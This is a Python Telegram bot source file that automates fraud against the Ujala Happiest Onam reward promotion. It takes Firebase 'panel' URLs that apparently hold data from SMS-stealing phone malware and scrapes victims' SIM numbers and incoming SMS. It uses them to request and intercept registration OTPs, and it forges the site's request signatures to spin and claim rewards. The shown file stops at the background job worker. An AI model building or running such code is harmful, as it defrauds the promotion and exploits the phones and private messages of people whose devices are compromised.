#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# VIEDIET UJALA BOT (UNIFIED) - Firebase Selection & Monitoring Edition
# ============================================================================
# Merged bot: "main (50).py" (Reward Spin Bot) + Panel Automation
#
# USAGE IS 100% FREE - NO REFERRALS, NO POINTS, NO LIMITS
# Users can:
#   * Spin as many times as they want (completely free, unlimited)
#   * Add exactly ONE Firebase URL of their own (the only limit in the bot)
#   * Every added panel is automatically scanned for online devices
#   * The user SELECTS their panel (it is the only one); it is processed:
#       discover devices -> extract numbers -> OTP -> verify -> spin -> claim
#   * After every successful claim, a 10-minute SMS monitor is spawned for
#     that device; reward-code / Ujala SMS messages are forwarded to the user
#   * Users CAN delete their own Firebase URL at any time (e.g. when the
#     panel is not active) and add a NEW one in its place
#
# FIREBASE LIMIT (the only limit):
#   * 1 Firebase panel per user
#   * User can delete it himself and add a new one whenever he wants
#
# All heavy background work (panel processing, scans, SMS monitors) runs
# through ONE FIFO JOB QUEUE with a bounded worker pool (JOB_WORKERS, default
# 3). The bot can never crash from too many users - every user simply waits
# their turn and sees their queue position on screen.
#
# Force channel join: BOTH channels are required:
#   @viedietlooters  and  @NARUTOxLOOT
#
# Admin can:
#   * View every user's Firebase URL (full list + details)
#   * DELETE any Firebase URL (with confirmation, owner gets notified)
#   * See which panel is selected for each user
#
# All progress is reported by EDITING a single message (no message spam).
#
# SETUP
# -----
#     export BOT_TOKEN="YOUR_BOT_TOKEN"
#     export ADMIN_ID="1364476174"
#     export CHANNEL_USERNAME="viedietlooters"
#     export CHANNEL2_USERNAME="NARUTOxLOOT"
#     export DATA_DIR="./data"
#     export JOB_WORKERS="3"      # optional: max parallel background jobs
#     python3 viediet_ujala_bot.py
#
# REQUIREMENTS (see requirements.txt)
# ------------
#     pip install -r requirements.txt   (pyTelegramBotAPI>=4.24.0, requests>=2.31.0)
# ============================================================================

# ════════════════════════════════════════════════════════════════════════════
# IMPORTS
# ════════════════════════════════════════════════════════════════════════════
import os
import re
import sys
import json
import time
import base64
import hmac
import random
import string
import logging
import hashlib
import sqlite3
import threading
import queue
import urllib.parse
from datetime import datetime
from html import escape

import requests
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# aiohttp is optional: used for fast async panel discovery when available,
# otherwise a synchronous requests fallback is used automatically.
try:
    import asyncio
    import aiohttp
    HAS_AIOHTTP = True
except ImportError:
    asyncio = None
    aiohttp = None
    HAS_AIOHTTP = False

# ════════════════════════════════════════════════════════════════════════════
# 1. CONFIGURATION (environment variables)
# ════════════════════════════════════════════════════════════════════════════

BOT_TOKEN = os.environ.get("BOT_TOKEN").strip()
ADMIN_ID = int(os.environ.get("ADMIN_ID", "8139558808").strip() or "0")
CHANNEL_USERNAME = os.environ.get("CHANNEL_USERNAME", "viedietlooters").strip().lstrip("@")
CHANNEL2_USERNAME = os.environ.get("CHANNEL2_USERNAME", "NARUTOxLOOT").strip().lstrip("@")
DATA_DIR = os.environ.get("DATA_DIR", "./data").strip()

PRODUCT_CODE = "8902102126232"                   # Ujala product code (hardcoded)
GROUP_LINK = "https://t.me/viedietlooterschat"   # support group (selection changes / help)
PAGE_SIZE = 10                                   # admin list pagination size
API_RETRIES = 2                                  # max attempts for every Ujala API call
OTP_POLL_SECONDS = 45                            # how long to poll the panel SMS node
JOB_WORKERS = int(os.environ.get("JOB_WORKERS", "3"))  # max parallel background jobs
JOB_WAIT_TIME = int(os.environ.get("JOB_WAIT_TIME", "2"))  # sec between job numbers

if not BOT_TOKEN:
    print("ERROR: BOT_TOKEN environment variable is not set.")
    print("       export BOT_TOKEN=\"YOUR_BOT_TOKEN\"")
    sys.exit(1)
if ADMIN_ID <= 0:
    print("ERROR: ADMIN_ID environment variable is not set.")
    print("       export ADMIN_ID=\"YOUR_TELEGRAM_ID\"")
    sys.exit(1)

os.makedirs(DATA_DIR, exist_ok=True)
DB_PATH = os.path.join(DATA_DIR, "reward_bot.db")

# ════════════════════════════════════════════════════════════════════════════
# 2. LOGGING (console + file)
# ════════════════════════════════════════════════════════════════════════════
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)-7s | %(message)s",
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler(os.path.join(DATA_DIR, "bot.log"), encoding="utf-8"),
    ],
)
logger = logging.getLogger("viediet_ujala_bot")

# ════════════════════════════════════════════════════════════════════════════
# 3. BOT INITIALIZATION
# ════════════════════════════════════════════════════════════════════════════
bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")

# ════════════════════════════════════════════════════════════════════════════
# 4. DATABASE (SQLite)
# ════════════════════════════════════════════════════════════════════════════

# One global lock so concurrent threads never corrupt SQLite state
_db_lock = threading.RLock()


def get_conn():
    """Open a connection with check_same_thread disabled (thread-safe usage)."""
    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn


def init_db():
    """Create all required tables if they do not exist yet."""
    with _db_lock:
        conn = get_conn()
        try:
            conn.executescript(
                """
                CREATE TABLE IF NOT EXISTS users (
                    user_id        INTEGER PRIMARY KEY,
                    username       TEXT,
                    first_name     TEXT,
                    registered_at  TEXT,
                    channel_joined INTEGER DEFAULT 0,
                    is_admin       INTEGER DEFAULT 0,
                    last_spin      TEXT,
                    banned         INTEGER DEFAULT 0,
                    slots_used     INTEGER DEFAULT 0,
                    unlimited_firebase INTEGER DEFAULT 0,
                    custom_max_slots INTEGER DEFAULT -1
                );

                CREATE TABLE IF NOT EXISTS spin_history (
                    id        INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id   INTEGER,
                    phone     TEXT,
                    reward    TEXT,
                    spin_time TEXT
                );

                CREATE TABLE IF NOT EXISTS user_firebases (
                    id             INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id        INTEGER,
                    firebase_url   TEXT,
                    added_at       TEXT,
                    status         TEXT DEFAULT 'pending',
                    last_processed TEXT,
                    summary        TEXT,
                    monitor_active INTEGER DEFAULT 0,
                    is_selected    INTEGER DEFAULT 0,
                    UNIQUE (user_id, firebase_url)
                );
                """
            )
            # ── Migration: add new columns to pre-existing databases ──
            user_cols = [r[1] for r in conn.execute("PRAGMA table_info(users)").fetchall()]
            if "unlimited_firebase" not in user_cols:
                conn.execute("ALTER TABLE users ADD COLUMN unlimited_firebase INTEGER DEFAULT 0")
                logger.info("Migrated users table: added unlimited_firebase column")
            if "custom_max_slots" not in user_cols:
                conn.execute("ALTER TABLE users ADD COLUMN custom_max_slots INTEGER DEFAULT -1")
                logger.info("Migrated users table: added custom_max_slots column")
            fb_cols = [r[1] for r in conn.execute("PRAGMA table_info(user_firebases)").fetchall()]
            if "monitor_active" not in fb_cols:
                conn.execute("ALTER TABLE user_firebases ADD COLUMN monitor_active INTEGER DEFAULT 0")
                logger.info("Migrated user_firebases table: added monitor_active column")
            if "is_selected" not in fb_cols:
                conn.execute("ALTER TABLE user_firebases ADD COLUMN is_selected INTEGER DEFAULT 0")
                logger.info("Migrated user_firebases table: added is_selected column")
            conn.commit()
        finally:
            conn.close()
    logger.info("Database initialized: %s", DB_PATH)


# ─────────────────────────── users ───────────────────────────

def get_user(user_id):
    """Fetch one user row as dict (or None)."""
    with _db_lock:
        conn = get_conn()
        try:
            row = conn.execute("SELECT * FROM users WHERE user_id = ?", (user_id,)).fetchone()
            return dict(row) if row else None
        finally:
            conn.close()


def create_user(user_id, username, first_name):
    """
    Insert a new user (IGNORE if exists).
    Returns True if the user was newly created.
    """
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    is_admin = 1 if user_id == ADMIN_ID else 0
    with _db_lock:
        conn = get_conn()
        try:
            cur = conn.execute(
                """INSERT OR IGNORE INTO users
                   (user_id, username, first_name, registered_at, channel_joined,
                    is_admin)
                   VALUES (?, ?, ?, ?, 0, ?)""",
                (user_id, username, first_name, now, is_admin),
            )
            conn.commit()
            return cur.rowcount > 0
        finally:
            conn.close()


def update_user(user_id, **fields):
    """Generic column updater for the users table."""
    if not fields:
        return
    with _db_lock:
        conn = get_conn()
        try:
            cols = ", ".join(f"{k} = ?" for k in fields)
            conn.execute(f"UPDATE users SET {cols} WHERE user_id = ?",
                         (*fields.values(), user_id))
            conn.commit()
        finally:
            conn.close()


# ─────────────────────────── spin history ───────────────────────────

def record_spin(user_id, phone, reward):
    """Insert one row into spin_history and stamp last_spin on the user."""
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with _db_lock:
        conn = get_conn()
        try:
            conn.execute(
                "INSERT INTO spin_history (user_id, phone, reward, spin_time) VALUES (?, ?, ?, ?)",
                (user_id, phone, reward, now),
            )
            conn.execute("UPDATE users SET last_spin = ? WHERE user_id = ?", (now, user_id))
            conn.commit()
        finally:
            conn.close()


def get_spin_history(user_id, limit=10):
    """Most recent spins of a user."""
    with _db_lock:
        conn = get_conn()
        try:
            rows = conn.execute(
                "SELECT phone, reward, spin_time FROM spin_history WHERE user_id = ? ORDER BY id DESC LIMIT ?",
                (user_id, limit),
            ).fetchall()
            return [dict(r) for r in rows]
        finally:
            conn.close()


def get_spin_count(user_id):
    """Total number of spins done by a user."""
    with _db_lock:
        conn = get_conn()
        try:
            row = conn.execute("SELECT COUNT(*) FROM spin_history WHERE user_id = ?",
                               (user_id,)).fetchone()
            return row[0]
        finally:
            conn.close()


# ─────────────────────────── user_firebases ───────────────────────────

def get_firebase_count(user_id):
    """Number of Firebase URLs a user has added."""
    with _db_lock:
        conn = get_conn()
        try:
            row = conn.execute(
                "SELECT COUNT(*) FROM user_firebases WHERE user_id = ?", (user_id,)
            ).fetchone()
            return row[0]
        finally:
            conn.close()


def is_duplicate_firebase(user_id, firebase_url):
    """True if this user already added this exact URL."""
    with _db_lock:
        conn = get_conn()
        try:
            row = conn.execute(
                "SELECT id FROM user_firebases WHERE user_id = ? AND firebase_url = ?",
                (user_id, firebase_url),
            ).fetchone()
            return row is not None
        finally:
            conn.close()


def add_firebase(user_id, firebase_url, status="pending", summary=None):
    """Insert a new Firebase URL for a user; returns the new row id or None."""
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with _db_lock:
        conn = get_conn()
        try:
            if summary is not None:
                cur = conn.execute(
                    """INSERT INTO user_firebases (user_id, firebase_url, added_at,
                                                   status, summary)
                       VALUES (?, ?, ?, ?, ?)""",
                    (user_id, firebase_url, now, status, summary),
                )
            else:
                cur = conn.execute(
                    """INSERT INTO user_firebases (user_id, firebase_url, added_at, status)
                       VALUES (?, ?, ?, ?)""",
                    (user_id, firebase_url, now, status),
                )
            conn.commit()
            return cur.lastrowid
        except sqlite3.IntegrityError:
            return None
        finally:
            conn.close()


def get_firebase_by_id(fb_id):
    """Fetch one firebase row as dict (or None)."""
    with _db_lock:
        conn = get_conn()
        try:
            row = conn.execute("SELECT * FROM user_firebases WHERE id = ?", (fb_id,)).fetchone()
            return dict(row) if row else None
        finally:
            conn.close()


def get_user_firebases(user_id):
    """All Firebase URLs of one user (newest first)."""
    with _db_lock:
        conn = get_conn()
        try:
            rows = conn.execute(
                "SELECT * FROM user_firebases WHERE user_id = ? ORDER BY id DESC",
                (user_id,),
            ).fetchall()
            return [dict(r) for r in rows]
        finally:
            conn.close()


def get_all_firebases():
    """All Firebase URLs across all users (newest first)."""
    with _db_lock:
        conn = get_conn()
        try:
            rows = conn.execute(
                "SELECT * FROM user_firebases ORDER BY id DESC"
            ).fetchall()
            return [dict(r) for r in rows]
        finally:
            conn.close()


def get_firebases_by_status(user_id, status):
    """All Firebase URLs of one user with the given status."""
    with _db_lock:
        conn = get_conn()
        try:
            rows = conn.execute(
                "SELECT * FROM user_firebases WHERE user_id = ? AND status = ? ORDER BY id DESC",
                (user_id, status),
            ).fetchall()
            return [dict(r) for r in rows]
        finally:
            conn.close()


def has_active_processing(user_id):
    """True if the user already has a panel with status 'processing'."""
    return bool(get_firebases_by_status(user_id, "processing"))


def reset_stale_processing(max_age_seconds=7200):
    """
    Mark panels stuck in 'processing' as 'error' (e.g. bot restarted while a
    job was running). Called periodically by the scheduler.
    """
    with _db_lock:
        conn = get_conn()
        try:
            cutoff = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            rows = conn.execute(
                "SELECT id FROM user_firebases WHERE status = 'processing'"
            ).fetchall()
            for row in rows:
                fb = dict(conn.execute(
                    "SELECT * FROM user_firebases WHERE id = ?", (row["id"],)
                ).fetchone())
                if not fb.get("last_processed"):
                    continue
                try:
                    last = datetime.strptime(fb["last_processed"], "%Y-%m-%d %H:%M:%S")
                    if (datetime.now() - last).total_seconds() > max_age_seconds:
                        conn.execute(
                            "UPDATE user_firebases SET status = 'error', summary = ? WHERE id = ?",
                            ("⚠️ Stale (bot restarted mid-process)", fb["id"]),
                        )
                except ValueError:
                    continue
            conn.commit()
        finally:
            conn.close()


def update_firebase(fb_id, **fields):
    """Generic updater for the user_firebases table."""
    if not fields:
        return
    with _db_lock:
        conn = get_conn()
        try:
            cols = ", ".join(f"{k} = ?" for k in fields)
            conn.execute(f"UPDATE user_firebases SET {cols} WHERE id = ?",
                         (*fields.values(), fb_id))
            conn.commit()
        finally:
            conn.close()


def delete_firebase(fb_id):
    """Delete one Firebase row. Returns True on success."""
    with _db_lock:
        conn = get_conn()
        try:
            row = conn.execute(
                "SELECT user_id FROM user_firebases WHERE id = ?", (fb_id,)
            ).fetchone()
            if not row:
                return False
            conn.execute("DELETE FROM user_firebases WHERE id = ?", (fb_id,))
            conn.commit()
            return True
        finally:
            conn.close()


# ─────────────────────── selection lock helpers ───────────────────────

def get_selected_firebase(user_id):
    """The user's currently SELECTED panel row, or None."""
    with _db_lock:
        conn = get_conn()
        try:
            row = conn.execute(
                "SELECT * FROM user_firebases WHERE user_id = ? AND is_selected = 1",
                (user_id,),
            ).fetchone()
            return row
        finally:
            conn.close()


def set_firebase_selected(fb_id, user_id):
    """Lock exactly one panel: clear any previous selection, set this one."""
    with _db_lock:
        conn = get_conn()
        try:
            conn.execute(
                "UPDATE user_firebases SET is_selected = 0 WHERE user_id = ?", (user_id,)
            )
            conn.execute(
                "UPDATE user_firebases SET is_selected = 1 WHERE id = ? AND user_id = ?",
                (fb_id, user_id),
            )
            conn.commit()
        finally:
            conn.close()


def is_firebase_selected(fb_id):
    with _db_lock:
        conn = get_conn()
        try:
            row = conn.execute(
                "SELECT is_selected FROM user_firebases WHERE id = ?", (fb_id,)
            ).fetchone()
            return bool(row and row["is_selected"])
        finally:
            conn.close()


# ─────────────────────────── admin queries ───────────────────────────

def get_all_user_ids():
    """All user ids (used by broadcast)."""
    with _db_lock:
        conn = get_conn()
        try:
            rows = conn.execute("SELECT user_id FROM users").fetchall()
            return [r["user_id"] for r in rows]
        finally:
            conn.close()


def get_all_users():
    """All users sorted by registration date (newest first)."""
    with _db_lock:
        conn = get_conn()
        try:
            rows = conn.execute("SELECT * FROM users ORDER BY registered_at DESC").fetchall()
            return [dict(r) for r in rows]
        finally:
            conn.close()


def get_stats():
    """Aggregate numbers shown in the admin STATS menu."""
    with _db_lock:
        conn = get_conn()
        try:
            total_users = conn.execute("SELECT COUNT(*) FROM users").fetchone()[0]
            joined_today = conn.execute(
                "SELECT COUNT(*) FROM users WHERE date(registered_at) = date('now')"
            ).fetchone()[0]
            channel_joined = conn.execute(
                "SELECT COUNT(*) FROM users WHERE channel_joined = 1"
            ).fetchone()[0]
            banned = conn.execute("SELECT COUNT(*) FROM users WHERE banned = 1").fetchone()[0]
            total_spins = conn.execute("SELECT COUNT(*) FROM spin_history").fetchone()[0]
            spins_today = conn.execute(
                "SELECT COUNT(*) FROM spin_history WHERE date(spin_time) = date('now')"
            ).fetchone()[0]
            total_firebases = conn.execute("SELECT COUNT(*) FROM user_firebases").fetchone()[0]
            return {
                "total_users": total_users,
                "joined_today": joined_today,
                "channel_joined": channel_joined,
                "banned": banned,
                "total_spins": total_spins,
                "spins_today": spins_today,
                "total_firebases": total_firebases,
            }
        finally:
            conn.close()


def get_analytics():
    """Detailed breakdown shown in the admin ANALYTICS menu."""
    stats = get_stats()
    with _db_lock:
        conn = get_conn()
        try:
            spinners = conn.execute(
                "SELECT COUNT(DISTINCT user_id) FROM spin_history"
            ).fetchone()[0]
            return {**stats, "spinners": spinners}
        finally:
            conn.close()


# ════════════════════════════════════════════════════════════════════════════
# 5. UJALA HAPPIEST ONAM API INTEGRATION  (from main (50).py - with retries)
# ════════════════════════════════════════════════════════════════════════════

BASE_URL = "https://www.ujalahappiestonam.com/api/users"
MASTER_KEY = "660395654"

# 1x1 pixel dummy JPEG used as the "pack" image (the API multipart form
# requires a file, the image itself is not really needed).
DUMMY_JPEG_B64 = (
    "/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8U"
    "HRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/wAALCAABAAEBAREA"
    "/8QAFAABAAAAAAAAAAAAAAAAAAAACf/EABQQAQAAAAAAAAAAAAAAAAAAAAD/2gAIAQEA"
    "AD8AVN//2Q=="
)

api_session = requests.Session()
api_session.headers.update({
    "User-Agent": ("Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 "
                   "(KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36"),
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.9",
    "Origin": "https://www.ujalahappiestonam.com",
    "Referer": "https://www.ujalahappiestonam.com/",
})

_dummy_image_path = None


def get_dummy_image():
    """Lazily write the dummy JPEG once and return its path."""
    global _dummy_image_path
    if _dummy_image_path is None:
        _dummy_image_path = os.path.join(DATA_DIR, "dummy_pack.jpg")
        if not os.path.exists(_dummy_image_path):
            with open(_dummy_image_path, "wb") as f:
                f.write(base64.b64decode(DUMMY_JPEG_B64))
    return _dummy_image_path


def get_timestamp():
    """Ujala API expects millisecond timestamps."""
    return int(time.time() * 1000)


def generate_signature_data(payload, user_key, data_key):
    """
    Replicates the HMAC based signature used by the Ujala API.
    Output format: base64(ts) . base64(payload) . obfuscated-signature
    """
    payload_str = json.dumps(payload, separators=(",", ":"))
    a = base64.b64encode(payload_str.encode()).decode()
    ts = str(payload["t"])
    u = base64.b64encode(ts.encode()).decode()
    hmac_key = data_key[4:18].encode()
    message = f"{u}.{a}".encode()
    h = hmac.new(hmac_key, message, hashlib.sha256)
    hex_sig = h.hexdigest()
    f = base64.b64encode(hex_sig.encode()).decode()
    m = random.randint(1, 6)
    k = random.randint(2, 8)
    alphabet = string.ascii_letters + string.digits
    h_rand = "".join(random.choice(alphabet) for _ in range(k))
    g = f"{k}{m}{f[0:m]}{h_rand}{f[m:]}"
    return f"{u}.{a}.{g}"


def decrypt_resp(encrypted):
    """Responses are base64 JSON blobs; decode them safely."""
    try:
        return json.loads(base64.b64decode(encrypted).decode()), True
    except Exception:
        return {"error": "decrypt_failed", "raw": str(encrypted)[:200]}, False


def api_create_user():
    """Create a new Ujala session -> (user_key, data_key) or (None, None)."""
    for attempt in range(1, API_RETRIES + 1):
        try:
            r = api_session.post(BASE_URL, json={"masterKey": MASTER_KEY}, timeout=10)
            decoded, ok = decrypt_resp(r.json().get("resp", ""))
            if ok and decoded.get("statusCode") == 200:
                return str(decoded["userKey"]), decoded["dataKey"]
        except Exception as e:
            logger.error("api_create_user attempt %d failed: %s", attempt, e)
        time.sleep(1)
    return None, None


def send_otp(user_key, data_key, name, mobile, code, city="Kerala"):
    """Request an OTP on the given mobile. Returns True/False (with retries)."""
    image_path = get_dummy_image()
    for attempt in range(1, API_RETRIES + 1):
        try:
            t = get_timestamp()
            payload = {
                "name": name, "mobile": mobile, "email": "", "city": city,
                "code": code, "agreed1": "Yes", "agreed2": "Yes",
                "userKey": int(user_key), "t": t,
            }
            data_value = generate_signature_data(payload, user_key, data_key)
            files = {"pack": ("pack.jpg", open(image_path, "rb"), "image/jpeg")}
            form_data = {"t": str(t), "userKey": user_key, "data": data_value}
            r = api_session.post(f"{BASE_URL}/getOTP/{user_key}?t={t}",
                                 data=form_data, files=files, timeout=15)
            files["pack"][1].close()
            decoded, ok = decrypt_resp(r.json().get("resp", ""))
            if ok and decoded.get("statusCode") == 200:
                return True
            logger.warning("send_otp bad response: %s", decoded)
        except Exception as e:
            logger.error("send_otp attempt %d failed: %s", attempt, e)
        time.sleep(1)
    return False


def verify_otp(user_key, data_key, otp):
    """Verify the OTP -> returns auth token or None (with retries)."""
    for attempt in range(1, API_RETRIES + 1):
        try:
            t = get_timestamp()
            payload = {"otp": otp, "userKey": int(user_key), "t": t}
            data_value = generate_signature_data(payload, user_key, data_key)
            u, a, g = data_value.split(".", 2)
            body = (f"userKey={user_key}&data={urllib.parse.quote_plus(u)}."
                    f"{urllib.parse.quote_plus(a)}.{urllib.parse.quote_plus(g)}")
            r = api_session.post(
                f"{BASE_URL}/verifyOTP/{user_key}?t={t}", data=body,
                headers={"content-type": "application/x-www-form-urlencoded; charset=UTF-8"},
                timeout=10,
            )
            decoded, ok = decrypt_resp(r.json().get("resp", ""))
            if ok and decoded.get("statusCode") == 200:
                return decoded.get("token")
            logger.warning("verify_otp bad response: %s", decoded)
        except Exception as e:
            logger.error("verify_otp attempt %d failed: %s", attempt, e)
        time.sleep(1)
    return None


def spin_wheel(user_key, data_key, token):
    """Spin the wheel -> returns reward string or None (with retries)."""
    for attempt in range(1, API_RETRIES + 1):
        try:
            t = get_timestamp()
            payload = {"userKey": int(user_key), "t": t}
            data_value = generate_signature_data(payload, user_key, data_key)
            u, a, g = data_value.split(".", 2)
            body = (f"userKey={user_key}&data={urllib.parse.quote_plus(u)}."
                    f"{urllib.parse.quote_plus(a)}.{urllib.parse.quote_plus(g)}")
            headers = {
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "authorization": f"Bearer {token}",
            }
            r = api_session.post(f"{BASE_URL}/speenTheWheel/{user_key}?t={t}",
                                 data=body, headers=headers, timeout=10)
            decoded, ok = decrypt_resp(r.json().get("resp", ""))
            if ok and decoded.get("statusCode") == 200:
                return decoded.get("reward", "Unknown")
            logger.warning("spin_wheel bad response: %s", decoded)
        except Exception as e:
            logger.error("spin_wheel attempt %d failed: %s", attempt, e)
        time.sleep(1)
    return None


def claim_reward(user_key, data_key, token):
    """Claim the won reward -> True/False (with retries)."""
    for attempt in range(1, API_RETRIES + 1):
        try:
            t = get_timestamp()
            payload = {"userKey": int(user_key), "t": t}
            data_value = generate_signature_data(payload, user_key, data_key)
            u, a, g = data_value.split(".", 2)
            body = (f"userKey={user_key}&data={urllib.parse.quote_plus(u)}."
                    f"{urllib.parse.quote_plus(a)}.{urllib.parse.quote_plus(g)}")
            headers = {
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "authorization": f"Bearer {token}",
            }
            r = api_session.post(f"{BASE_URL}/claimNow/{user_key}?t={t}",
                                 data=body, headers=headers, timeout=10)
            decoded, ok = decrypt_resp(r.json().get("resp", ""))
            if ok and decoded.get("statusCode") == 200:
                return True
            logger.warning("claim_reward bad response: %s", decoded)
        except Exception as e:
            logger.error("claim_reward attempt %d failed: %s", attempt, e)
        time.sleep(1)
    return False


# ════════════════════════════════════════════════════════════════════════════
# 6. FIREBASE PANEL DISCOVERY & SMS OTP FETCHING
# ════════════════════════════════════════════════════════════════════════════

# ─── Add more phone-number keys ──────────────────────────
def extract_all_nums(*dicts):
    nums = []
    keys_to_check = [
        "sim1Number", "sim2Number", "numberSim1", "numberSim2",
        "mobNo", "phoneNumber", "phone", "mobile",
        "sim1", "sim2", "number1", "number2", "mobileNumber",
        "sim1No", "sim2No", "mob", "phoneNo"
    ]
    for d in dicts:
        if not isinstance(d, dict):
            continue
        for k in keys_to_check:
            val = str(d.get(k, ""))
            if val and len(re.sub(r"\D", "", val)) >= 10:
                clean = re.sub(r"\D", "", val)
                nums.append(clean[-10:])
    return list(set(nums))

# ─── Try multiple paths ──────────────────────────────
def fb_get_first(base_url, path_list, timeout=8):
    for path in path_list:
        try:
            r = requests.get(f"{base_url}/{path}.json", timeout=timeout)
            if r.status_code == 200:
                data = r.json()
                if isinstance(data, dict) and data:
                    return path, data
        except Exception:
            continue
    return None, None

def check_panel_active(url):
    """
    Discover online devices by probing multiple known paths.
    Returns a report dict or None.
    """
    # 1) Try to get the root keys to understand the structure
    root_data = None
    try:
        r = requests.get(f"{url}/.json", timeout=8)
        if r.status_code == 200:
            root_data = r.json()
    except:
        pass

    sim_path = None
    device_path = None
    sim_data = None
    device_data = None

    if isinstance(root_data, dict):
        # Look for common top-level keys
        if "All_Users" in root_data and isinstance(root_data["All_Users"], dict):
            all_users = root_data["All_Users"]
            # Try inside All_Users
            if "simDetails" in all_users:
                sim_path = "All_Users/simDetails"
                sim_data = all_users["simDetails"]
            elif "sim" in all_users:
                sim_path = "All_Users/sim"
                sim_data = all_users["sim"]
            elif "simDetails" in all_users:
                sim_path = "All_Users/simDetails"
                sim_data = all_users["simDetails"]
            if "Data" in all_users and isinstance(all_users["Data"], dict):
                if "DeviceInfo" in all_users["Data"]:
                    device_path = "All_Users/Data/DeviceInfo"
                    device_data = all_users["Data"]["DeviceInfo"]
                elif "deviceInfo" in all_users["Data"]:
                    device_path = "All_Users/Data/deviceInfo"
                    device_data = all_users["Data"]["deviceInfo"]
                else:
                    # All_Users/Data IS the device info directly
                    device_path = "All_Users/Data"
                    device_data = all_users["Data"]
        else:
            # Root-level simDetails or DeviceInfo
            if "simDetails" in root_data:
                sim_path = "simDetails"
                sim_data = root_data["simDetails"]
            elif "sim" in root_data:
                sim_path = "sim"
                sim_data = root_data["sim"]
            elif "devices" in root_data:
                sim_path = "devices"
                sim_data = root_data["devices"]
            if "DeviceInfo" in root_data:
                device_path = "DeviceInfo"
                device_data = root_data["DeviceInfo"]
            elif "deviceInfo" in root_data:
                device_path = "deviceInfo"
                device_data = root_data["deviceInfo"]
            elif "Data" in root_data and isinstance(root_data["Data"], dict):
                device_path = "Data"
                device_data = root_data["Data"]

    # 2) If still not found, use a list of fallback paths
    if sim_data is None:
        fallback_sim = [
            "All_Users/simDetails",
            "All_Users/sim",
            "simDetails",
            "sim",
            "devices",
            "All_Users/devices"
        ]
        found_path, sim_data = fb_get_first(url, fallback_sim)
        if found_path:
            sim_path = found_path

    if device_data is None:
        fallback_device = [
            "All_Users/Data/DeviceInfo",
            "All_Users/Data/deviceInfo",
            "All_Users/Data",
            "All_Users/DeviceInfo",
            "DeviceInfo",
            "deviceInfo",
            "All_Users/devicesInfo"
        ]
        found_path, device_data = fb_get_first(url, fallback_device)
        if found_path:
            device_path = found_path

    # If we still don't have sim_data, give up
    if not sim_data:
        return None

    # Build the report
    info_all = device_data if isinstance(device_data, dict) else {}
    online_devices = []
    for dev_id, sim in sim_data.items():
        info = info_all.get(dev_id) or {}
        status = str(info.get("Status", "")).lower()
        is_online = status == "online"
        if not is_online and "Status" not in info and "status" not in info:
            is_online = bool(info.get("phoneNumber") or info.get("phone") or info.get("mobile"))
        if is_online:
            nums = extract_all_nums(sim, info)
            if nums:
                online_devices.append({
                    "id": dev_id,
                    "numbers": nums,
                    "status": "online"
                })
    if not online_devices:
        return None
    total_nums = sum(len(d["numbers"]) for d in online_devices)
    return {
        "url": url,
        "online_devices": online_devices,
        "total_devices": len(online_devices),
        "total_numbers": total_nums,
    }


def fetch_otp_from_sms(panel_url, device_id, timeout=OTP_POLL_SECONDS):
    """
    Poll the panel's SMS node (All_Users/sms/{device_id}) until a new SMS
    containing a 6-digit OTP appears. Returns the OTP string or None.
    """
    existing_keys = set()
    try:
        initial = requests.get(f"{panel_url}/All_Users/sms/{device_id}.json", timeout=5)
        if initial.status_code == 200 and initial.json():
            existing_keys = set(initial.json().keys())
    except Exception:
        pass
    start_time = time.time()
    while time.time() - start_time < timeout:
        try:
            resp = requests.get(f"{panel_url}/All_Users/sms/{device_id}.json", timeout=5)
            if resp.status_code == 200:
                data = resp.json()
                if data and isinstance(data, dict):
                    for sms_key, sms_value in data.items():
                        if sms_key not in existing_keys:
                            if isinstance(sms_value, dict):
                                body = str(sms_value.get("body") or sms_value.get("message")
                                           or sms_value.get("text") or "")
                                match = re.search(r"Your OTP to register is (\d{6})",
                                                  body, re.IGNORECASE)
                                if match:
                                    return match.group(1)
                                match = re.search(r"\b(\d{6})\b", body)
                                if match and any(k in body for k in
                                                 ["BigCity", "Ujala", "Onam", "register"]):
                                    return match.group(1)
                                existing_keys.add(sms_key)
        except Exception:
            pass
        time.sleep(0.5)
    return None


# ════════════════════════════════════════════════════════════════════════════
# 7. PANEL PROCESSING (background thread per Firebase URL)
# ════════════════════════════════════════════════════════════════════════════

# Guards: fb_id currently being processed (prevents double jobs)
_processing_jobs = set()
_processing_lock = threading.RLock()

# fb_id -> owner user_id (used to enforce ONE job per user in the queue)
_processing_owners = {}

# ─────────────────────── background job queue ───────────────────────
# All heavy background work (panel processing, scans, SMS monitors) goes
# through ONE FIFO queue with a bounded worker pool. This caps the number
# of concurrent threads/API calls so the bot can never be crashed by many
# users triggering jobs at the same time - every user simply waits their
# turn in the queue (fairness: first come, first served).
_job_queue = queue.Queue()


def _enqueue_job(kind, args):
    """Put one background job (kind, args) at the END of the FIFO queue."""
    _job_queue.put((kind, args))
    return _job_queue.qsize()


def _dispatch_job(kind, args):
    """Run one job by its kind. Exceptions are caught per job."""
    if kind == "process":
        process_firebase_job(*args)
    elif kind == "scan":
        scan_firebases_and_present(*args)
    elif kind == "check":
        check_firebases_and_confirm(*args)
    elif kind == "monitor":
        start_user_sms_monitor(*args)


def _job_worker():
    """Single queue worker: pulls jobs one at a time, forever."""
    while True:
        kind, args = _job_queue.get()
        try:
            _dispatch_job(kind, args)
        except Exception:
            logger.exception("Queue job failed (kind=%s)", kind)
